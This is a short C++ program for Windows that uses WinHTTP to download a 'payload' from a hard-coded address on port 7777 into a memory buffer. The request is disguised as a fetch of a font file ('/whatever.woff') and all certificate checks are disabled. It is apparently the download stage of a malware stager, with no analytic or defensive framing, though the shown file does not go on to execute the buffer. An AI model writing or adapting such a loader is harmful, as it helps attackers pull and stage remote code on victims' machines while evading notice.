#include <windows.h>
#include <winhttp.h>
#include <stdlib.h>

#pragma comment(lib, "winhttp.lib")

// adjust size to the expected payload size
unsigned char buf[1];

void dl_to_buffer(const wchar_t* host, INTERNET_PORT port)
{
	int counter = 0;
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	BOOL bResults = FALSE;

	HINTERNET hSession = NULL;
	HINTERNET hConnect = NULL;
	HINTERNET hRequest = NULL;

	DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

	hSession = WinHttpOpen(L"WinHTTP CPP Client/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

	if (hSession) {
		hConnect = WinHttpConnect(hSession, host, port, 0);
	}

	if (hConnect) {
		hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/whatever.woff", L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);
	}

	if (hRequest) {
		if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags))) {
			exit(443);
		}
		bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	}

	if (bResults) {
		bResults = WinHttpReceiveResponse(hRequest, NULL);
	}

	if (bResults) {
		do
		{
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
				break;
			}

			if (!dwSize) {
				break;
			}

			pszOutBuffer = new char[dwSize + 1];

			if (!pszOutBuffer) {
				break;
			}

			ZeroMemory(pszOutBuffer, dwSize + 1);

			if (WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
    			if (counter + dwDownloaded <= sizeof(buf)) {
        			memcpy(&buf[counter], pszOutBuffer, dwDownloaded);
        			counter += dwDownloaded;
    			}
			}

			delete[] pszOutBuffer;

			if (!dwDownloaded) {
				break;
			}

		} while (dwSize > 0);
	}

	if (hRequest) { 
    	WinHttpCloseHandle(hRequest); 
	}
	if (hConnect) { 
    	WinHttpCloseHandle(hConnect); 
	}
	if (hSession) { 
    	WinHttpCloseHandle(hSession); 
	}
}

int main()
{
	dl_to_buffer(L"192.168.10.10", 7777);
	return 0;
}